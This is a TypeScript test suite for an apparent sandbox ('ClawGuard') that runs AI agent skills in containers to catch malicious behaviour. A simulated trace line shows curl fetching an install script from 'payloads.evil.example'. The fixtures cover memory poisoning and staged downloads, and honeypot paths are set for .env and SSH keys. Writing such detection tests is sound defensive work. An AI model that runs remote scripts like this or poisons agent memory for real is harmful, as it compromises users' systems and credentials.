import assert from "node:assert/strict";
import { access, writeFile } from "node:fs/promises";
import path from "node:path";
import { test } from "node:test";

import type { DetonationRequest } from "@clawguard/contracts";
import { loadFixtureSnapshot } from "@clawguard/fixtures";
import { createPlatformAdapter } from "@clawguard/platform";

import type { PreparedDetonationEnvironment } from "./environment.js";
import {
  createDetonationRuntimeProvider,
  RuntimeCommandTimeoutError,
  type DetonationRuntimeProvider,
} from "./index.js";
import { buildPromptRunnerPlan, runPromptRunner } from "./prompt-runner.js";

const REQUEST_TIMEOUT_SECONDS = 90;

test("runPromptRunner executes prompt steps through the prompt harness", async () => {
  const request = createSyntheticRequest({
    prompts: ["Summarize what the skill can do."],
  });
  const invocations: Array<{ command: string; args: string[] }> = [];

  const result = await runPromptRunner(createStubProvider(), request, {
    skillMarkdown: "# Passive Skill\n\nNo runnable commands.\n",
    prepareEnvironment: createStubPrepareEnvironment(),
    async commandRunner(_provider, _environment, command, args) {
      invocations.push({
        command,
        args,
      });

      return {
        exitCode: 0,
        stdout: JSON.stringify({ action: "noop" }),
        stderr: "",
      };
    },
  });

  assert.equal(invocations.length, result.plan.promptCount);
  assert.ok(invocations.every((entry) => entry.command === "node"));
  assert.ok(result.execution.every((entry) => entry.status === "completed"));
  assert.ok(result.execution.every((entry) => entry.command === "node"));
});

test("runPromptRunner captures traces and diffs before cleanup", async () => {
  const request: DetonationRequest = {
    requestId: "request-evidence-capture",
    snapshot: loadFixtureSnapshot("malicious-memory-poisoning"),
    prompts: ["Exercise one workflow."],
    timeoutSeconds: REQUEST_TIMEOUT_SECONDS,
  };
  let rootDir = "";

  const result = await runPromptRunner(createStubProvider(), request, {
    minPrompts: 1,
    maxPrompts: 1,
    async commandRunner(_provider, environment) {
      rootDir = environment.host.rootDir;
      await writeFile(
        path.join(environment.host.workspaceDir, ".clawguard", "traces", "prompt-1.trace.1001"),
        '12:00:00.000000 execve("/usr/bin/curl", ["curl", "https://payloads.evil.example/install.sh"], 0x0) = 0\n',
        "utf8",
      );
      await writeFile(environment.host.memoryFiles.memory, "# MEMORY\n- poisoned\n", "utf8");
      await writeFile(path.join(environment.host.skillDir, "captured.txt"), "payload\n", "utf8");

      return {
        exitCode: 0,
        stdout: "",
        stderr: "",
      };
    },
  });

  assert.equal(result.stepTraces[0]?.files[0]?.filename, "prompt-1.trace.1001");
  assert.equal(
    result.memoryDiffs.some((diff) => diff.changed && diff.currentContent.includes("poisoned")),
    true,
  );
  assert.equal(
    result.fileChanges.some(
      (change) =>
        change.path.endsWith("/captured.txt") && change.currentHash?.startsWith("sha256:") === true,
    ),
    true,
  );
  await assert.rejects(access(rootDir));
});

test("buildPromptRunnerPlan extracts common staged install commands from setup sections", async () => {
  const request = createSyntheticRequest();
  const markdown = `# Setup Heavy Skill

## Setup
Before first use, run \`git clone https://example.com/tooling && ./install.sh\`.
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  assert.equal(plan.setupCommandCount, 1);
  assert.equal(
    plan.steps.some(
      (step) =>
        step.type === "setup-command" &&
        step.value === "git clone https://example.com/tooling && ./install.sh",
    ),
    true,
  );
});

test("buildPromptRunnerPlan ignores inline command examples outside runnable setup sections", async () => {
  const request = createSyntheticRequest();
  const markdown = `# Example Skill

## Troubleshooting
For example, inspect endpoints with \`curl https://api.example.com/health\` when debugging.
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  assert.equal(plan.setupCommandCount, 0);
  assert.equal(
    plan.steps.some((step) => step.boundCommand === "curl https://api.example.com/health"),
    false,
  );
});

test("buildPromptRunnerPlan extracts fenced setup blocks from surrounding prose cues", async () => {
  const request = createSyntheticRequest();
  const markdown = `# Quick Start Skill

## Quick start
Before first use, run:

\`\`\`bash
pnpm install
\`\`\`
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  assert.equal(plan.setupCommandCount, 1);
  assert.equal(
    plan.steps.some((step) => step.type === "setup-command" && step.value === "pnpm install"),
    true,
  );
});

test("buildPromptRunnerPlan ignores fenced example commands under workflow headings", async () => {
  const request = createSyntheticRequest();
  const markdown = `# Example Skill

## Commands
For example, inspect health with:

\`\`\`bash
curl https://api.example.com/health
\`\`\`
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  assert.equal(
    plan.steps.some((step) => step.boundCommand === "curl https://api.example.com/health"),
    false,
  );
});

test("buildPromptRunnerPlan binds workflow commands only to workflow prompt steps", async () => {
  const request = createSyntheticRequest({
    prompts: [],
  });
  const markdown = `# Workflow Skill

## Setup
Run \`bash scripts/install.sh\` before first use.

## Workflow
\`git clone https://example.com/tooling && ./install.sh\`

## Commands
\`npx example-cli sync\`
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  const workflowPromptSteps = plan.steps.filter(
    (step) => step.type === "prompt" && step.boundCommand,
  );
  const setupSteps = plan.steps.filter((step) => step.type === "setup-command");
  const setupReviewPrompt = plan.steps.find((step) => step.intent === "run-setup-review");

  assert.deepEqual(
    workflowPromptSteps.map((step) => step.boundCommand),
    ["git clone https://example.com/tooling && ./install.sh", "npx example-cli sync"],
  );
  assert.equal(setupSteps.length, 1);
  assert.equal(setupReviewPrompt?.boundCommand, undefined);
  assert.equal(
    setupSteps.every((step) => step.boundCommand === undefined),
    true,
  );
});

test("buildPromptRunnerPlan preserves multiline fenced shell blocks as single commands", async () => {
  const request = createSyntheticRequest({
    prompts: [],
  });
  const markdown = `# Workflow Skill

## Setup
\`\`\`bash
git clone https://example.com/tooling repo
cd repo
pnpm install
\`\`\`

## Workflow
\`\`\`bash
cd repo
npx example-cli sync
\`\`\`
`;

  const plan = await buildPromptRunnerPlan(request, {
    skillMarkdown: markdown,
  });

  const setupSteps = plan.steps.filter((step) => step.type === "setup-command");
  const workflowPromptSteps = plan.steps.filter(
    (step) => step.type === "prompt" && step.boundCommand,
  );

  assert.equal(setupSteps.length, 1);
  assert.equal(
    setupSteps[0]?.value,
    "git clone https://example.com/tooling repo\ncd repo\npnpm install",
  );
  assert.deepEqual(
    workflowPromptSteps.map((step) => step.boundCommand),
    ["cd repo\nnpx example-cli sync"],
  );
});

test("runPromptRunner aborts after a failing workflow step and marks later steps skipped", async () => {
  const request = createSyntheticRequest();
  const result = await runPromptRunner(createStubProvider(), request, {
    skillMarkdown: `# Workflow Failure Skill

## Workflow
\`npx dangerous-task\`
`,
    prepareEnvironment: createStubPrepareEnvironment(),
    async commandRunner(_provider, _environment, command, args) {
      const workflowCommandIndex = args.indexOf("--workflow-command");
      if (
        command === "node" &&
        workflowCommandIndex >= 0 &&
        args[workflowCommandIndex + 1] === "npx dangerous-task"
      ) {
        return {
          exitCode: 23,
          stdout: "",
          stderr: "workflow failed",
        };
      }

      return {
        exitCode: 0,
        stdout: "",
        stderr: "",
      };
    },
  });

  const failedStepIndex = result.execution.findIndex((entry) => entry.status === "failed");
  assert.notEqual(failedStepIndex, -1);
  assert.equal(result.execution[failedStepIndex]?.boundCommand, "npx dangerous-task");
  assert.equal(result.execution[failedStepIndex]?.command, "node");
  assert.ok(
    result.execution.slice(failedStepIndex + 1).every((entry) => entry.status === "skipped"),
  );
});

test("runPromptRunner marks timed out steps failed, skips later steps, and cleans up", async () => {
  const request = createSyntheticRequest({
    timeoutSeconds: 1,
  });
  let cleanedUp = false;

  const result = await runPromptRunner(createStubProvider(), request, {
    skillMarkdown: "# Timeout Skill\n\nNo runnable commands.\n",
    prepareEnvironment: createStubPrepareEnvironment({
      onCleanup() {
        cleanedUp = true;
      },
    }),
    async commandRunner(_provider, _environment, command, args, runOptions) {
      throw new RuntimeCommandTimeoutError(command, args, runOptions?.timeoutMs ?? 1);
    },
  });

  assert.equal(cleanedUp, true);
  assert.equal(result.execution[0]?.status, "failed");
  assert.match(result.execution[0]?.errorMessage ?? "", /timed out/u);
  assert.ok(result.execution.slice(1).every((entry) => entry.status === "skipped"));
});

test("runPromptRunner executes the staged-download fixture setup script in an operational podman runtime", async (t) => {
  const provider = await createOperationalRuntimeProvider();
  if (!provider) {
    t.skip("No operational Podman runtime is available.");
    return;
  }

  const request: DetonationRequest = {
    requestId: "request-runtime-staged-download",
    snapshot: loadFixtureSnapshot("malicious-staged-download"),
    prompts: ["Initialize the skill once."],
    timeoutSeconds: REQUEST_TIMEOUT_SECONDS,
  };

  const result = await runPromptRunner(provider, request, {
    minPrompts: 3,
    maxPrompts: 3,
  });

  const setupStep = result.execution.find((entry) => entry.type === "setup-command");
  assert.ok(setupStep);
  assert.equal(setupStep?.command, "bash");
  assert.equal(setupStep?.status, "failed");

  const combinedOutput = `${setupStep?.result?.stdout ?? ""}\n${setupStep?.result?.stderr ?? ""}`;
  assert.match(combinedOutput, /payloads\.evil\.example|curl/u);
  assert.ok(
    result.execution
      .slice(result.execution.indexOf(setupStep) + 1)
      .every((entry) => entry.status === "skipped"),
  );
});

function createSyntheticRequest(overrides: Partial<DetonationRequest> = {}): DetonationRequest {
  return {
    requestId: overrides.requestId ?? "request-synthetic",
    snapshot: overrides.snapshot ?? {
      slug: "synthetic-skill",
      path: "/tmp/synthetic-skill",
      sourceHints: [{ kind: "fixture", detail: "synthetic" }],
      contentHash: "sha256:synthetic",
      fileInventory: ["SKILL.md"],
      detectedAt: new Date(0).toISOString(),
    },
    prompts: overrides.prompts ?? [],
    timeoutSeconds: overrides.timeoutSeconds ?? REQUEST_TIMEOUT_SECONDS,
  };
}

function createStubPrepareEnvironment(
  options: { onCleanup?: () => void } = {},
): (request: DetonationRequest) => Promise<PreparedDetonationEnvironment> {
  return async (request) => ({
    request,
    layout: {
      homeDir: "/home/clawguard",
      configPath: "/home/clawguard/.openclaw/openclaw.json",
      workspaceDir: "/workspace/openclaw",
      skillsDir: "/workspace/openclaw/skills",
      memoryFiles: {
        memory: "/workspace/openclaw/MEMORY.md",
        soul: "/workspace/openclaw/SOUL.md",
        user: "/workspace/openclaw/USER.md",
      },
      honeypots: {
        envFile: "/home/clawguard/.env",
        sshKey: "/home/clawguard/.ssh/id_rsa",
      },
    },
    host: {
      rootDir: "/tmp/root",
      homeDir: "/tmp/root/home",
      configPath: "/tmp/root/home/.openclaw/openclaw.json",
      workspaceDir: "/tmp/root/workspace",
      skillsDir: "/tmp/root/workspace/skills",
      skillDir: "/tmp/root/workspace/skills/synthetic-skill",
      helpers: {
        promptHarness: "/tmp/root/workspace/.clawguard/prompt-harness.mjs",
      },
      memoryFiles: {
        memory: "/tmp/root/workspace/MEMORY.md",
        soul: "/tmp/root/workspace/SOUL.md",
        user: "/tmp/root/workspace/USER.md",
      },
      honeypots: {
        envFile: "/tmp/root/home/.env",
        sshKey: "/tmp/root/home/.ssh/id_rsa",
      },
    },
    baseline: {
      rootDir: "/tmp/root/baseline",
      homeDir: "/tmp/root/baseline/home",
      configPath: "/tmp/root/baseline/home/.openclaw/openclaw.json",
      workspaceDir: "/tmp/root/baseline/workspace",
      skillsDir: "/tmp/root/baseline/workspace/skills",
      skillDir: "/tmp/root/baseline/workspace/skills/synthetic-skill",
      helpers: {
        promptHarness: "/tmp/root/baseline/workspace/.clawguard/prompt-harness.mjs",
      },
      memoryFiles: {
        memory: "/tmp/root/baseline/workspace/MEMORY.md",
        soul: "/tmp/root/baseline/workspace/SOUL.md",
        user: "/tmp/root/baseline/workspace/USER.md",
      },
      honeypots: {
        envFile: "/tmp/root/baseline/home/.env",
        sshKey: "/tmp/root/baseline/home/.ssh/id_rsa",
      },
    },
    container: {
      homeDir: "/home/clawguard",
      configPath: "/home/clawguard/.openclaw/openclaw.json",
      workspaceDir: "/workspace/openclaw",
      skillsDir: "/workspace/openclaw/skills",
      skillDir: "/workspace/openclaw/skills/synthetic-skill",
      helpers: {
        promptHarness: "/workspace/openclaw/.clawguard/prompt-harness.mjs",
      },
      memoryFiles: {
        memory: "/workspace/openclaw/MEMORY.md",
        soul: "/workspace/openclaw/SOUL.md",
        user: "/workspace/openclaw/USER.md",
      },
      honeypots: {
        envFile: "/home/clawguard/.env",
        sshKey: "/home/clawguard/.ssh/id_rsa",
      },
    },
    async cleanup() {
      options.onCleanup?.();
    },
  });
}

function createStubProvider(): DetonationRuntimeProvider {
  return {
    runtime: "podman",
    command: "podman",
    async ensureSandboxImage() {
      return {
        runtime: "podman",
        runtimeCommand: "podman",
        imageTag: "image:fake",
        source: "cache",
      };
    },
    async runRuntimeCommand() {
      return {
        exitCode: 0,
        stdout: "",
        stderr: "",
      };
    },
  };
}

async function createOperationalRuntimeProvider(): Promise<DetonationRuntimeProvider | undefined> {
  try {
    const runtimeDetector = createPlatformAdapter().containerRuntimes;
    const provider = await createDetonationRuntimeProvider({
      runtimeDetector,
      preferredRuntime: "podman",
    });
    if (provider.runtime !== "podman") {
      return undefined;
    }

    const image = await provider.ensureSandboxImage();
    const smoke = await provider.runRuntimeCommand([
      "run",
      "--rm",
      image.imageTag,
      "node",
      "--version",
    ]);
    if (smoke.exitCode !== 0) {
      return undefined;
    }

    return provider;
  } catch (error) {
    if (isOperationalRuntimeError(error)) {
      return undefined;
    }

    throw error;
  }
}

function isOperationalRuntimeError(error: unknown): boolean {
  if (!(error instanceof Error)) {
    return false;
  }

  return [
    "Cannot connect to the Docker daemon",
    "podman machine",
    "connection refused",
    "no such host",
    "permission denied while trying to connect",
    "no container with name or ID",
    "Unable to build sandbox image",
    "Unable to pull sandbox image",
  ].some((fragment) => error.message.includes(fragment));
}
